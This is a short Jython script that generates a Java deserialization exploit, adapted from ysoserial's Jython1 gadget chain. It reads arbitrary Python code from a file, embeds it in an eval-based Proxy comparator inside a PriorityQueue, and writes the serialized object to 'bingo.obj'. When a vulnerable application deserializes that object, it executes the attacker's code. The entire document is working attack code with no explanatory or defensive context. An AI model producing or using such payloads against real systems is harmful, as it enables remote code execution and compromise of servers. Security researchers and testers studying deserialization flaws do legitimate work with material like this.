from org.python.core import PyMethod
from java.lang import Object
from java.io import BufferedOutputStream, ObjectOutputStream, FileOutputStream
from java.lang.reflect import Proxy
from java.util import Comparator, PriorityQueue
from array import array
import json

with open("payload.py", "r") as infile:
  incode = infile.read()
incodestr = json.dumps(incode)

handler = PyMethod(eval, None, object)
codeWrap = 'eval(compile(' + incodestr + ', "", "exec")) or 0'


# https://github.com/frohoff/ysoserial/blob/8eb5cbfbf6c47a23682f6186bea9baf6439e57b9/src/main/java/ysoserial/payloads/Jython1.java#L95

comparator = Proxy.newProxyInstance(Comparator.getClassLoader(), [Comparator], handler)

priorityQueue = PriorityQueue(2, comparator)
queueField = PriorityQueue.getDeclaredField("queue")
queueField.setAccessible(True)
queueField.set(priorityQueue, array(Object, [codeWrap, {}]))
sizeField = PriorityQueue.getDeclaredField("size")
sizeField.setAccessible(True)
sizeField.set(priorityQueue, 2)

oos = ObjectOutputStream(BufferedOutputStream(FileOutputStream("bingo.obj")))

oos.writeObject(priorityQueue)

oos.close()
